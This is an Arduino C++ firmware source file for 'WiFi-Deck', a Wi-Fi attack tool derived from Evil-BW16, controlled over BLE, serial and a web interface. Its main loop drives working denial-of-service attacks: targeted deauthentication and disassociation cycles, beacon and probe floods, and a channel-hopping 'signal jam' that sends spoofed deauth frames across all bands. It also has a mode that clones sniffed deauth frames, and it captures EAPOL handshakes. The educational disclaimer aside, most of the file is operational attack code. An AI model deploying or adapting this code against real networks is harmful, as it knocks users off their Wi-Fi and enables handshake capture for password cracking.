/*
   WiFi-Deck - Dual-Band Wi-Fi Testing & 802.11 Analysis Tool

   Copyright (c) 2026 xiangwen-ctrl

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <https://www.gnu.org/licenses/>.

   ---
   Based on Evil-BW16 v1.0.2 by 7h30th3r0n3 (https://github.com/7h30th3r0n3/Evil-BW16).
   The original Evil-BW16 portions remain subject to the MIT License below:

   Copyright (c) 2024 7h30th3r0n3

   Permission is hereby granted, free of charge, to any person obtaining a copy
   of this software and associated documentation files (the "Software"), to deal
   in the Software without restriction, including without limitation the rights
   to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
   copies of the Software, and to permit persons to whom the Software is
   furnished to do so, subject to the following conditions:

   The above copyright notice and this permission notice shall be included in all
   copies or substantial portions of the Software.

   THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
   IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
   FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
   AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
   LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
   OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
   SOFTWARE.

   Disclaimer:
   This tool is developed for educational and ethical testing purposes only.
   Any misuse or illegal use of this tool is strictly prohibited.
   Users must comply with all applicable laws and regulations.
*/

#include <Arduino.h>
#include "web.h"
#include "config.h"
#include "utils.h"
#include "sniff.h"
#include "wifi_scan.h"
#include "ble.h"
#include "wifi_attack.h"
#include "command.h"

#include "wifi_conf.h"
#include "wifi_util.h"
#include "platform_stdlib.h"
#include "osdep_service.h"
#include "FreeRTOS.h"
#include "semphr.h"
#include "wiring_watchdog.h"

//==========================================================
// Setup
//==========================================================
void setup() {
  Serial.begin(115200);

  uint32_t bootReason = BOOT_Reason();
  char bootMsg[160];
  snprintf(bootMsg, sizeof(bootMsg),
           "[BOOT] ResetReason=0x%08lX (WDG=%d KM4WDG=%d SYS=%d KM4SYS=%d BOD=%d DSLP=%d) FreeHeap=%luB",
           (unsigned long)bootReason,
           (bootReason & BIT_BOOT_WDG_RESET_HAPPEN) ? 1 : 0,
           (bootReason & BIT_BOOT_KM4WDG_RESET_HAPPEN) ? 1 : 0,
           (bootReason & BIT_BOOT_SYS_RESET_HAPPEN) ? 1 : 0,
           (bootReason & BIT_BOOT_KM4SYS_RESET_HAPPEN) ? 1 : 0,
           (bootReason & BIT_BOOT_BOD_RESET_HAPPEN) ? 1 : 0,
           (bootReason & BIT_BOOT_DSLP_RESET_HAPPEN) ? 1 : 0,
           (unsigned long)xPortGetFreeHeapSize());
  Serial.println(bootMsg);

  wdt_enable(8000);

  scanMutex = xSemaphoreCreateMutex();
  if (scanMutex == NULL) {
    Serial.println("[ERROR] Failed to create scanMutex!");
  }

  loadConfigFromFlash();
  feedWatchdog();

  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);
  if (USE_LED) {
    digitalWrite(LED_R, HIGH); delay(100); digitalWrite(LED_R, LOW);
    digitalWrite(LED_G, HIGH); delay(100); digitalWrite(LED_G, LOW);
    digitalWrite(LED_B, HIGH); delay(100); digitalWrite(LED_B, LOW);
  }
  feedWatchdog();

  Serial.println("=== WiFi-Deck v" FIRMWARE_VERSION " ===");
  Serial.println("[INFO] Starting WiFi AP (non-hidden)...");

  // Start AP in non-hidden mode so phones can discover it
  bool apReady = startSoftAP();
  feedWatchdog();

  if (apReady) {
    Serial.print("[INFO] AP started: ");
    Serial.println(ap_ssid);
    Serial.println("[INFO] Connect to this WiFi and open 192.168.1.1");
    Serial.println("[INFO] Web server started on port 80");
  } else {
    Serial.println("[ERROR] Initial SoftAP / WebServer startup failed (self-heal armed).");
  }

  // Start BLE UART service for the Android App
  setupBLE();
  feedWatchdog();

  last_cycle = millis();
}

//==========================================================
// Main Loop
//==========================================================
void loop() {
  feedWatchdog();

  // BLE 异常掉线复位：连接断开后若未收到 CCCD 取消订阅回调，bleNotifyEnabled 会残留为 true，
  // 导致对不存在的连接反复 notify
  uint8_t bleConnSnap = 0;
  bool bleNotifySnap = false;
  getBleStateSafe(bleConnSnap, bleNotifySnap);
  if (bleNotifySnap && !BLE.connected(bleConnSnap)) {
    rtw_enter_critical(NULL, NULL);
    if (activeConnId == bleConnSnap) {
      bleNotifyEnabled = false;
    }
    rtw_exit_critical(NULL, NULL);
    resetBleLogFlowControl();
  }

  processBleDiagAndNegotiation();
  ensureBleAdvertisingIfDisconnected();

  // 优先响应来自任意通道的急停标志，避免旧排队指令阻塞停机
  consumePriorityStopIfPending();

  bool warnOverflow = false;
  bool warnOversize = false;
  rtw_enter_critical(NULL, NULL);
  if (bleCmdQueueOverflow) {
    bleCmdQueueOverflow = false;
    warnOverflow = true;
  }
  if (bleCmdOversizeDrop) {
    bleCmdOversizeDrop = false;
    warnOversize = true;
  }
  rtw_exit_critical(NULL, NULL);
  if (warnOverflow) {
    Serial.println("[WARN] BLE command ring full; dropped oldest overflow command.");
    bleSendLog("[WARN] BLE 指令队列已满，部分指令被丢弃");
  }
  if (warnOversize) {
    Serial.println("[ERROR] BLE command exceeds max payload length (219B); rejected.");
    bleSendLog("[ERROR] BLE 单条指令超过 219B 上限，已拒绝");
  }

  // Handle commands from Serial via non-blocking line buffer
  pollSerialInput();
  while (serialCmdTail != serialCmdHead) {
    if (consumePriorityStopIfPending()) break;
    char sCmdBuf[BLE_BUF_SIZE];
    strncpy(sCmdBuf, serialCmdQueue[serialCmdTail], sizeof(sCmdBuf) - 1);
    sCmdBuf[sizeof(sCmdBuf) - 1] = '\0';
    serialCmdTail = (serialCmdTail + 1) % SERIAL_CMD_QUEUE_SIZE;
    handleCommand(String(sCmdBuf));
    pollSerialInput();
  }

  // Handle commands queued from the BLE task (critical section protected)
  while (true) {
    if (consumePriorityStopIfPending()) break;
    char cmdBuf[BLE_BUF_SIZE];
    bool hasCmd = false;
    rtw_enter_critical(NULL, NULL);
    if (cmdTail != cmdHead) {
      strncpy(cmdBuf, cmdRing[cmdTail], sizeof(cmdBuf) - 1);
      cmdBuf[sizeof(cmdBuf) - 1] = '\0';
      cmdTail = (cmdTail + 1) % CMD_RING_SIZE;
      hasCmd = true;
    }
    rtw_exit_critical(NULL, NULL);
    if (!hasCmd) break;
    handleCommand(String(cmdBuf));
  }

  // 兜底：若双队列排空后 emergencyStopRequested 仍置位且队列中无待消费的停机指令，立即执行一次安全停机复位活跃状态
  if (emergencyStopRequested) {
    bool stopQueued = false;
    uint8_t sIdx = serialCmdTail;
    while (sIdx != serialCmdHead) {
      if (isStopCmdCstr(serialCmdQueue[sIdx])) {
        stopQueued = true;
        break;
      }
      sIdx = (sIdx + 1) % SERIAL_CMD_QUEUE_SIZE;
    }
    if (!stopQueued && hasQueuedStopInCmdRing()) {
      stopQueued = true;
    }
    if (!stopQueued) {
      handleCommand("stop");
    }
  }

  // Pump non-blocking BLE scan/sync stream under 2A TX credit flow control
  pumpBleScanPush();

  // Handle web clients (throttled to 25ms to reduce lwIP non-blocking accept overhead)
  static unsigned long lastWebPoll = 0;
  if (millis() - lastWebPoll >= 25) {
    lastWebPoll = millis();
    handleWebClient();
  }

  // Deferred SoftAP restart after SSID/Password change (allows BLE notify / HTTP 200 to flush first)
  if (pendingApRestart && (millis() - pendingApRestartAt >= 300)) {
    pendingApRestart = false;
    bool sniffActive = false;
    rtw_enter_critical(NULL, NULL);
    sniffActive = (isSniffing || deauth_sniff_enabled);
    rtw_exit_critical(NULL, NULL);
    if (apEnabled && !sniffActive) {
      stopAllActiveAttacks();
      if (startSoftAP()) {
        Serial.print("[INFO] SoftAP restarted with new credentials: ");
        Serial.println(ap_ssid);
      } else {
        Serial.println("[ERROR] SoftAP restart with new credentials failed!");
      }
      blePushStatus();
    }
  }

  // Timed Attack check
  checkTimedAttack();

  // Attack cycles (3-OptA: non-blocking sliced TX across loop() ticks)
  if (deauthSlice.active) {
    if (!attack_enabled || emergencyStopRequested) {
      deauthSlice.reset();
      restoreDefaultChannelIfNeeded(false);
      if (USE_LED) digitalWrite(LED_B, LOW);
    } else if (!stepSlicedTxCycle(deauthSlice, true, true, 8)) {
      last_cycle = millis();
      checkTimedAttack();
    }
  } else if (millis() - last_cycle > cycle_delay) {
    if (attack_enabled && !emergencyStopRequested) {
      if (scan_between_cycles) {
        Serial.println("[INFO] Starting scan between attack cycles...");
        if (scanNetworks(true, true) == 0) {
          printScanResults();
        }
      }
      if (!shouldAbortCycle() && attack_enabled) {
        std::vector<WiFiScanResult> targets;
        bool isTargetMode = false;
        if (lockScanMutex()) {
          isTargetMode = target_mode;
          if (isTargetMode) {
            targets = target_aps;
          }
          unlockScanMutex();
        }
        if (isTargetMode && !targets.empty()) {
          deauthSlice.reset();
          deauthSlice.targets = targets;
          deauthSlice.active = true;
          if (USE_LED) digitalWrite(LED_B, HIGH);
          if (!stepSlicedTxCycle(deauthSlice, true, true, 8)) {
            last_cycle = millis();
            checkTimedAttack();
          }
        } else {
          // 决策 A：无已选目标时停止攻击而非回退全量攻击
          attack_enabled = false;
          timedAttackEnabled = false;
          blePushStatus();
          Serial.println("[WARN] Deauth attack stopped: no selected targets.");
          last_cycle = millis();
        }
      } else {
        checkTimedAttack();
        last_cycle = millis();
      }
    } else {
      last_cycle = millis();
    }
  }

  //===============================
  // CONTINUOUS DISASSOC ATTACK (3-OptA: non-blocking sliced TX)
  //===============================
  if (disassocSlice.active) {
    if (!disassoc_enabled || emergencyStopRequested) {
      disassocSlice.reset();
      restoreDefaultChannelIfNeeded(false);
      if (USE_LED) digitalWrite(LED_B, LOW);
    } else if (!stepSlicedTxCycle(disassocSlice, false, true, 8)) {
      Serial.println("[DISASSOC] Attack cycle completed.");
    }
  } else if (disassoc_enabled && !emergencyStopRequested && (millis() - last_disassoc_attack >= disassoc_interval)) {
    last_disassoc_attack = millis();

    std::vector<WiFiScanResult> aps_to_attack = snapshotDisassocTargets();

    if (aps_to_attack.empty()) {
      // 决策 A：无选定目标时停止 Disassoc，绝不回退全攻
      disassoc_enabled = false;
      restoreDefaultChannelIfNeeded(false);
      if (USE_LED) digitalWrite(LED_B, LOW);
      blePushStatus();
      Serial.println("[WARN] Disassoc stopped: no selected targets.");
    } else {
      disassocSlice.reset();
      disassocSlice.targets = aps_to_attack;
      disassocSlice.active = true;
      if (USE_LED) digitalWrite(LED_B, HIGH);
      if (!stepSlicedTxCycle(disassocSlice, false, true, 8)) {
        Serial.println("[DISASSOC] Attack cycle completed.");
      }
    }
  }

  //===============================
  // BEACON FLOOD
  //===============================
  if (beacon_flood_enabled && !emergencyStopRequested && (millis() - last_beacon_flood >= beacon_flood_delay)) {
    last_beacon_flood = millis();
    char fakeSSID[BEACON_MAX_SSID_LEN + 1];
    int ssidLen = random(8, 17);
    for (int i = 0; i < ssidLen; i++) {
      fakeSSID[i] = random(33, 127);
    }
    fakeSSID[ssidLen] = 0;
    wifi_tx_beacon_frame(fakeSSID, ssidLen, (uint8_t)getCurrentChannelSafe());
    beacon_flood_count++;
    if (beacon_flood_count % 20 == 0) {
      Serial.print("[BCN FLOOD] ");
      Serial.print(beacon_flood_count);
      Serial.println(" beacons sent");
    }
  }

  //===============================
  // PROBE FLOOD
  //===============================
  if (probe_flood_enabled && !emergencyStopRequested && (millis() - last_probe_flood >= probe_flood_delay)) {
    last_probe_flood = millis();
    char fakeSSID[BEACON_MAX_SSID_LEN + 1];
    int ssidLen = random(4, 13);
    for (int i = 0; i < ssidLen; i++) {
      fakeSSID[i] = random(33, 127);
    }
    fakeSSID[ssidLen] = 0;
    wifi_tx_probe_req_frame(fakeSSID, ssidLen);
    probe_flood_count++;
    if (probe_flood_count % 50 == 0) {
      Serial.print("[PRB FLOOD] ");
      Serial.print(probe_flood_count);
      Serial.println(" probes sent");
    }
  }

  //===============================
  // SIGNAL JAM (rapid channel cycling + deauth)
  //===============================
  if (signal_jam_enabled && !emergencyStopRequested && (millis() - last_signal_jam >= signal_jam_hop_delay)) {
    last_signal_jam = millis();
    feedWatchdog();
    // 合并轮询 2.4G + 5G 全信道，仅在切频成功时更新 currentChannel，并在 SoftAP 开启时及时回切 CH 1
    static const int num2G = sizeof(CHANNELS_2GHZ) / sizeof(CHANNELS_2GHZ[0]);
    static const int num5G = sizeof(CHANNELS_5GHZ) / sizeof(CHANNELS_5GHZ[0]);
    int totalChs = num2G + num5G;
    if (signal_jam_ch_index < 0 || signal_jam_ch_index >= totalChs) {
      signal_jam_ch_index = 0;
    }
    int targetCh = (signal_jam_ch_index < num2G)
      ? CHANNELS_2GHZ[signal_jam_ch_index]
      : CHANNELS_5GHZ[signal_jam_ch_index - num2G];
    signal_jam_ch_index = (signal_jam_ch_index + 1) % totalChs;

    if (wifi_set_channel(targetCh) == RTW_SUCCESS) {
      setCurrentChannelSafe(targetCh);
      for (int j = 0; j < 3; j++) {
        if (shouldAbortCycle()) break;
        uint8_t fakeBSSID[6];
        randomMAC(fakeBSSID);
        wifi_tx_deauth_frame(fakeBSSID, dst_mac, deauth_reasons[j % num_deauth_reasons]);
      }
      signal_jam_count++;
      if ((apEnabled || softApActive) && targetCh != WIFI_CHANNEL) {
        if (wifi_set_channel(WIFI_CHANNEL) == RTW_SUCCESS) {
          setCurrentChannelSafe(WIFI_CHANNEL);
        }
      }
    } else {
      Serial.print("[WARN] signal_jam wifi_set_channel(");
      Serial.print(targetCh);
      Serial.println(") failed");
    }
    if (USE_LED) { digitalWrite(LED_B, !digitalRead(LED_B)); }
    if (signal_jam_count > 0 && signal_jam_count % 50 == 0) {
      Serial.print("[SIG JAM] ");
      Serial.print(signal_jam_count);
      Serial.print(" cycles, ch=");
      Serial.println(targetCh);
    }
  }

  //===============================
  // DEAUTH SNIFF-AND-CLONE
  //===============================
  bool runDeauthCloneTx = false;
  uint8_t clonedSrc[6];
  int targetCh = WIFI_CHANNEL;
  int prevCh = WIFI_CHANNEL;
  if (millis() - last_deauth_sniff_attack >= deauth_sniff_interval) {
    rtw_enter_critical(NULL, NULL);
    if (deauth_sniff_enabled && !emergencyStopRequested && has_sniffed_deauth) {
      memcpy(clonedSrc, sniffed_deauth_src, 6);
      targetCh = sniffed_deauth_ch;
      prevCh = currentChannel;
      has_sniffed_deauth = false;
      runDeauthCloneTx = true;
    }
    rtw_exit_critical(NULL, NULL);
  }
  if (runDeauthCloneTx) {
    last_deauth_sniff_attack = millis();

    // Pause promisc callback briefly to TX cloned frame cleanly, without toggling UI isSniffing state
    wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0);
    if (promiscCallbackInFlight > 0) {
      waitForPromiscCallbacksIdle();
    }
    bool switched = false;
    bool chReady = (targetCh == prevCh);
    if (!chReady && wifi_set_channel(targetCh) == RTW_SUCCESS) {
      setCurrentChannelSafe(targetCh);
      switched = true;
      chReady = true;
    }
    if (chReady) {
      for (unsigned long j = 0; j < num_send_frames; j++) {
        if (shouldAbortCycle()) break;
        wifi_tx_deauth_frame(clonedSrc, dst_mac, deauth_reasons[j % num_deauth_reasons]);
        delay(1);
      }
    }
    if (switched && wifi_set_channel(prevCh) == RTW_SUCCESS) {
      setCurrentChannelSafe(prevCh);
    }
    bool keepPromisc = false;
    rtw_enter_critical(NULL, NULL);
    keepPromisc = (deauth_sniff_enabled && isSniffing && !emergencyStopRequested);
    rtw_exit_critical(NULL, NULL);
    if (keepPromisc) {
      wifi_set_promisc(RTW_PROMISC_ENABLE_2, promisc_callback, 1);
    }
  }

  // Handle channel hopping if enabled
  bool sniffingLoop = false;
  rtw_enter_critical(NULL, NULL);
  sniffingLoop = (isSniffing && !emergencyStopRequested);
  rtw_exit_critical(NULL, NULL);
  if (sniffingLoop) {
    hopChannel();
  }

  // Drain sniff logs safely in main loop:
  // - UART capped at <=25 lines/s (>=40ms interval) to prevent 115200 TX FIFO stalls under bursts.
  // - BLE sniff stream uses priority bypass (EAPOL/Deauth/Disassoc/Pwnagotchi) + adaptive backpressure
  //   (100ms..800ms, MTU-aware, credit headroom >=3) so Packet Stream stays populated without starving
  //   the 1s status heartbeat or LL supervision (disc_cause=0x0108).
  static unsigned long lastLogPush = 0;
  static unsigned long lastDropWarnMs = 0;
  unsigned long nowLoopMs = millis();
  if (nowLoopMs - lastLogPush >= 40) {
    char logItem[LOG_STR_LEN];
    bool hasLog = false;
    uint32_t dropped = 0;
    rtw_enter_critical(NULL, NULL);
    if (logTail != logHead) {
      size_t cp = strlen(sniffLogRing[logTail]) + 1;
      if (cp > sizeof(logItem)) cp = sizeof(logItem);
      memcpy(logItem, sniffLogRing[logTail], cp);
      logItem[sizeof(logItem) - 1] = '\0';
      logTail = (logTail + 1) % LOG_RING_SIZE;
      hasLog = true;
    }
    if (droppedLogCount > 0 && (nowLoopMs - lastDropWarnMs >= 2000)) {
      dropped = droppedLogCount;
      droppedLogCount = 0;
      lastDropWarnMs = nowLoopMs;
    }
    rtw_exit_critical(NULL, NULL);
    if (hasLog) {
      lastLogPush = nowLoopMs;
      Serial.println(logItem);

      uint8_t logConnId = 0;
      if (!bleScanPush.active && isBleReadyToNotifySafe(logConnId)) {
        bool isPriority = (strncmp(logItem, "[DATA] EAPOL", 12) == 0 ||
                           strncmp(logItem, "[MGMT] Deauth", 13) == 0 ||
                           strncmp(logItem, "[MGMT] Disassoc", 15) == 0 ||
                           strstr(logItem, "Pwnagotchi") != nullptr);
        if (isPriority) {
          if (lastBlePriorityLogMs == 0 || (nowLoopMs - lastBlePriorityLogMs >= 15)) {
            lastBlePriorityLogMs = nowLoopMs;
            if (!bleSendSniffLog((const char *)logItem, true)) {
              rtw_enter_critical(NULL, NULL);
              bleDroppedLogCount++;
              rtw_exit_critical(NULL, NULL);
            }
          }
        } else {
          uint16_t mtuSnap = getEffectiveBleAttMtu(logConnId);
          unsigned long baseIntervalMs = (mtuSnap < 80) ? BLE_SNIFF_LOW_MTU_INTERVAL_MS : BLE_SNIFF_BASE_INTERVAL_MS;
          unsigned long curBackoffMs = (bleLogBackoffMs < baseIntervalMs) ? baseIntervalMs : bleLogBackoffMs;
          if (lastBleRoutineLogMs == 0 || (nowLoopMs - lastBleRoutineLogMs >= curBackoffMs)) {
            lastBleRoutineLogMs = nowLoopMs;
            if (bleSendSniffLog((const char *)logItem, false)) {
              if (curBackoffMs > baseIntervalMs) {
                unsigned long excess = curBackoffMs - baseIntervalMs;
                bleLogBackoffMs = baseIntervalMs + ((excess > 50UL) ? (excess - 50UL) : 0UL);
              } else {
                bleLogBackoffMs = baseIntervalMs;
              }
            } else {
              unsigned long doubled = curBackoffMs * 2UL;
              bleLogBackoffMs = (doubled <= BLE_SNIFF_MAX_BACKOFF_MS) ? doubled : BLE_SNIFF_MAX_BACKOFF_MS;
              rtw_enter_critical(NULL, NULL);
              bleDroppedLogCount++;
              rtw_exit_critical(NULL, NULL);
            }
          }
        }
      }
    }
    if (dropped > 0) {
      char warnBuf[80];
      snprintf(warnBuf, sizeof(warnBuf), "[WARN] Sniff log ring dropped %lu overflow frames", (unsigned long)dropped);
      Serial.println(warnBuf);
    }
  }

  // Push status heartbeat every 1s (non-critical per 2A congestion control)
  static unsigned long lastStatusPush = 0;
  if (millis() - lastStatusPush >= 1000) {
    lastStatusPush = millis();
    blePushStatus(false);
  }

  // Periodic FreeHeap diagnostics every 30s (4A)
  static unsigned long lastHeapDiagMs = 0;
  unsigned long nowDiagMs = millis();
  if (nowDiagMs - lastHeapDiagMs >= 30000) {
    lastHeapDiagMs = nowDiagMs;
    size_t freeHeap = xPortGetFreeHeapSize();
    size_t minHeap = xPortGetMinimumEverFreeHeapSize();
    char diagBuf[96];
    snprintf(diagBuf, sizeof(diagBuf), "[DIAG] FreeHeap=%luB MinEver=%luB Uptime=%lus",
             (unsigned long)freeHeap,
             (unsigned long)minHeap,
             (unsigned long)(nowDiagMs / 1000UL));
    Serial.println(diagBuf);
    if (freeHeap < 24576) {
      Serial.println("[WARN] Low FreeHeap (<24KB)!");
    }
  }
}
